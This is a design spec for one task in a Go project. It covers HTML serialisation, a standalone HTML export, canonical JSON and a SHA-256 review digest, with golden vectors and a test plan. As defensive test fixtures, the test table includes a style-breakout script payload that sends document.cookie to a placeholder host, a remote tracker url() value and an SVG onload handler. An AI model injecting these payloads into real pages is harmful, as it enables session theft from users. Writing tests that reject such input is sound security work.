# Task 08 — Canonical HTML, export HTML, canonical JSON, the review digest

**Plan:** `../2026-09-23-phase-5-design-canvas.md` · **Depends on:** 05, 07 · **Hours:** 2.5

## Why

Three consumers need the same subtree as text, and each needs it byte-stable:

- **`get_html`** (task 15) — an agent reads back exactly what it wrote, in the dialect, and can
  send it back through `write_html` (round trip).
- **The review digest** (spec §7.6) — SHA-256 over the canonical serialisation of the approved
  artboards, their assets, the tokens they use, and the brief key reviewed against. *Changed after
  approval* is "the digest at head differs from the approved digest", so the digest must be a pure
  function of **content**: no node ids, no revision, no author, no lock flag.
- **The handoff bundle** (task 21) — a standalone `.html` file per artboard that opens in a browser.

## Files

- `canvas/serialize/html.go`, `export.go`, `canonjson.go`, `digest.go` (new)
- `canvas/serialize/*_test.go`, `testdata/` (new)

## Contracts

```go
// canvas/serialize/html.go
package serialize

type HTMLOptions struct {
	IDs    bool // emit data-node="n-…" on every element (get_html's default); the digest uses false
	Pretty bool // two-space indentation and a newline per element; the digest and export use false
}

// HTML serialises the subtree rooted at nodeID in the dialect. Rules:
//   - one element per node: its Tag; void tags (img, input) have no close tag and no "/";
//   - attributes in this order: data-node (if IDs), name (if non-empty), aria-label, the
//     tag's kept attributes sorted by name (alt, checked, placeholder, type, value), hidden
//     (a boolean attribute, when Node.Hidden), style (last, if any);
//   - style is "prop: value" pairs sorted by property name, joined by "; ", no trailing ";";
//   - text: & < > escaped as &amp; &lt; &gt;, "\n" as <br>; attribute values escape & < > " ;
//   - image: src="<asset ref>" and alt; svg: Node.SVG verbatim (canonical: root xmlns, well-formed,
//     ids prefixed with the node id, so two icons in one exported artboard share no id, review I8;
//     HTML trusts it, ExportHTML below re-checks it first, re-review RR-M1);
//   - Locked, X, Y, Revision and EditedBy are never emitted;
//   - an <a> is emitted with href="#" as its first attribute after data-node.
// The output parses back through dialect.Parse to the same nodes (ids aside) — the round trip.
// "Ids aside" includes the node-id prefix inside an svg node's markup: Parse re-prefixes it to the
// new node id, so the round trip compares svg markup as SanitiseSVG("", …) of each side.
func HTML(d *doc.Doc, nodeID string, o HTMLOptions) (string, error)
```

```go
// canvas/serialize/export.go

// ExportHTML is one artboard as a standalone document for the handoff bundle:
//
//   <!doctype html>
//   <html lang="en"><head><meta charset="utf-8">
//   <meta name="viewport" content="width=<artboard px width>">
//   <title><artboard name, escaped></title>
//   <style>:root{<every token the artboard uses, "--name: value;" sorted>}html,body{margin:0}</style>
//   </head><body><HTML(artboard, IDs:false) with each asset ref rewritten></body></html>
//
// assetPath maps an asset ref to the relative path the bundle writes it at
// (task 21: "assets/<hex>.<ext>"). No script, no external URL, ever.
//
// Every token it writes into <style> is re-checked with dialect.Checker{}.TokenValue
// first (review I2), and a refused one fails the export with dialect.ErrUnsafeToken
// (task 07) wrapped with the token's name — never written, never silently dropped.
// Apply refuses such a value already (task 06 set_token), but a document can reach
// here without that check: store.Replay applies logged ops with an accept-everything
// Checker (task 10), and a past revision is loaded from disk. This is the last Go
// line before a browser.
// The same threat covers node content, so ExportHTML re-checks that too (re-review
// RR-M1; a log recorded under an older, looser allowlist replays unchecked): every
// svg node's Checker{}.SVG(id, Node.SVG) must return Node.SVG byte for byte, and
// every declaration of every node must pass dialect.CheckDeclaration. The first
// failure fails the export with ErrUnsafeToken's sibling dialect.ErrUnsafeNode
// (task 07) wrapped with the node id and the property or "svg" — one error, never a
// silently dropped declaration. HTML (above) stays a pure writer; only ExportHTML,
// the bundle's path to a browser, re-checks.
func ExportHTML(d *doc.Doc, artboardID string, assetPath func(ref string) string) (string, error)

// TokensUsed is every token referenced by var(--x) in the subtree, closed over
// token values: the closure (a fixed point, however many levels deep, with a
// visited set so a reference cycle terminates and each token appears once),
// sorted by name. Unknown names are skipped. Task 12's token notices and the
// export's tokens.css both rely on the closure (re-review RR-I11-2).
func TokensUsed(d *doc.Doc, nodeID string) []doc.Token

// AssetsUsed is every asset ref in the subtree (img src and url() values), sorted.
func AssetsUsed(d *doc.Doc, nodeID string) []string
```

```go
// canvas/serialize/canonjson.go

// CanonicalJSON is the canvas's own canonical encoding (plan P5-U):
// encoding/json with SetEscapeHTML(false), the trailing newline removed.
// It is canonical only for the envelope types below, whose fields are
// declared in lexicographic order of their JSON names and which hold no
// floats; TestEnvelopeFieldOrder enforces both by reflection.
func CanonicalJSON(v any) ([]byte, error)
```

```go
// canvas/serialize/digest.go

// ReviewEnvelope is what an approval's reviewDigest covers. Fields are in
// lexicographic JSON order (canonjson.go).
type ReviewEnvelope struct {
	Artboards []ReviewArtboard `json:"artboards"` // every artboard (plan P5-H): by page order, then artboard order
	Assets    []string         `json:"assets"`    // AssetsUsed over all artboards, sorted, de-duplicated
	BriefKey  string           `json:"briefKey"`  // the brief key reviewed against, verbatim (never parsed, G9)
	CanvasID  string           `json:"canvasId"`
	Kind      string           `json:"kind"`      // "design-review"
	Tokens    []doc.Token      `json:"tokens"`    // TokensUsed over all artboards, sorted by name, de-duplicated
	V         int              `json:"v"`         // 1
}

type ReviewArtboard struct {
	HTML string `json:"html"` // HTML(artboard, IDs:false, Pretty:false)
	ID   string `json:"id"`   // the artboard's node id: an artboard replaced by an identical one is a change
	Name string `json:"name"`
	Page string `json:"page"` // the page's name
}

// ReviewDigest returns "sha256:" + lowercase hex of SHA-256(CanonicalJSON(env)).
// An asset's bytes are covered through its ref, which is their SHA-256.
func ReviewDigest(d *doc.Doc, briefKey string) (digest string, env ReviewEnvelope, err error)
```

### Golden vectors — checked into `digest_test.go`

The document: canvas `cv-00000000000000c1`; page `Page 1`; artboard `n-0000000000a1` named `Card`
with `width: 390px; height: fit-content`; one child, a `p` text node `Hello` with
`color: var(--brand)`; token `brand` (color) `#2fb3bd`. Computed on 2026-09-24 with `sha256sum` and
again with Python's `hashlib`; both agree.

**Vector 1** — brief key `brief:bf-00000000000000a1@5`, 366 bytes:

```
{"artboards":[{"html":"<div name=\"Card\" style=\"height: fit-content; width: 390px\"><p style=\"color: var(--brand)\">Hello</p></div>","id":"n-0000000000a1","name":"Card","page":"Page 1"}],"assets":[],"briefKey":"brief:bf-00000000000000a1@5","canvasId":"cv-00000000000000c1","kind":"design-review","tokens":[{"name":"brand","type":"color","value":"#2fb3bd"}],"v":1}
sha256:d369645afcdb2b5fef7b1684ac803c0c1d167ff25a9bb6c6ef9234d5bb3ca376
```

**Vector 2** — the same document, brief key `brief:bf-00000000000000a1@6` (the re-review of brief
D3), 366 bytes:

```
sha256:8208d6b88abd5a17f75475bc729f9abb23f7efa9fc2bf0fff66fe0833186cc9b
```

A Go implementation passes when `CanonicalJSON(env)` reproduces vector 1's bytes exactly and both
digests match.

## Tests first

| Test | Asserts | Kills the mutant |
|---|---|---|
| `TestReviewDigest_vectors` | both vectors, byte for byte and digest for digest | `SetEscapeHTML(true)` (the six-character JSON escape `\u003c` (a backslash, then `u003c`) in place of each literal `<` in the vectors' `html`, which moves the digest); a trailing newline |
| `TestReviewDigest_contentOnly` | a `set_props{locked:true}`, an undo-then-redo, and a comment each leave the digest unchanged; a colour change moves it | ids, revisions or authors in the envelope (would make every comment *"changed after approval"*) |
| `TestReviewDigest_tokenValue` | changing `brand`'s value moves the digest though no node changed | tokens missing from the envelope |
| `TestEnvelopeFieldOrder` | by reflection, every field of `ReviewEnvelope`, `ReviewArtboard` and `doc.Token` is in lexicographic JSON-name order, and none is a float | a field added out of order, silently changing canonical bytes |
| `TestHTML_attributeOrder` | a node with every attribute kind emits them in the stated order | map iteration order leaking into output |
| `TestHTML_roundTrip` (property test over 500 random documents) | `dialect.Parse(HTML(n, IDs:false))` yields nodes whose kinds, tags, names, styles, text, assets and order equal the source's | a serialiser the parser cannot read back |
| `TestHTML_escapes` | text `a < b & "c"` and a name with `"` serialise escaped and round-trip | unescaped text (a script vector on re-parse) |
| `TestHTML_newlines` | text `"a\nb"` emits `a<br>b` | `\n` emitted raw (collapsed by the browser) |
| `TestExportHTML_standalone` | the output has no `http`, no `src=` outside `assets/`, no `<script`, and one `:root` block with exactly the tokens used | an export that references the canvas |
| `TestExportHTML_hostileNode` (re-review RR-M1) | the same permissive-`Checker` fixture route, in turn: an svg node whose stored `SVG` is `<svg xmlns="http://www.w3.org/2000/svg" onload="x()"/>`; an svg node whose stored markup is canonical for another node id; a frame with the declaration `margin: 0` (not in the dialect) → each an error that `errors.Is` `dialect.ErrUnsafeNode` and names the node id (and `svg` or `margin`), no string returned; a document built through the real `Checker` exports unchanged | an export that trusts a replayed document's node content (SVG written verbatim, declarations unchecked) |
| `TestExportHTML_hostileToken` | a fixture document built through `Apply` with a permissive fake `Checker` (as `store.Replay` would), whose artboard uses `var(--brand)`, with `brand` (type `font-family`) set in turn to each of the review's two values — `red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>` and `url(https://tracker.example/p.png)` → an error that `errors.Is` `dialect.ErrUnsafeToken` and names `brand`, and no string returned; the same document with `brand` = `"Inter", sans-serif` exports | a script or a remote fetch in the bundle's `<slug>.html` the moment a person opens it (review I2) |
| `TestTokensUsed_transitive` | four rows. A node using `var(--a)`, with `--a: var(--b)` and `--b: var(--c)`, yields `a`, `b`, `c`. A 40-token chain `t1 → t2 → … → t40` yields all 40 (kills a depth cap standing in for the visited set). A cycle, `--a: var(--b)` and `--b: var(--a)`, returns `a`, `b` once each, and returns (the test runs it under a 1 s timeout). A chain through an unknown name, `--a: var(--gone)`, yields `a` only | nested tokens dropped from export; a one-hop reading (direct references plus theirs, `c` missed; re-review RR-I11-2); a cycle that never ends or repeats a token; a closure capped at a fixed depth |

## Steps

1. Write the tests, with the two vectors as literals. 2. Implement the four files. 3. Acceptance;
commit by pathspec.

## Acceptance

```bash
cd /c/Users/au-dev-dmackie1/Projects/PanaceaApp/.claude/worktrees/phase-5 && go test ./canvas/serialize/... -race -count=1
```
Expected: `ok  	github.com/kpmg-au-emu/panacea-app/canvas/serialize`.

## Not claimed

- The digest does not cover pixels. Two renderers that paint the same HTML differently produce the
  same digest; the PNG in the snapshot (task 21) is what the approver saw, recorded, not digested.
- JSX and token files are task 09.
- No TypeScript computes this digest, or any digest (G9).
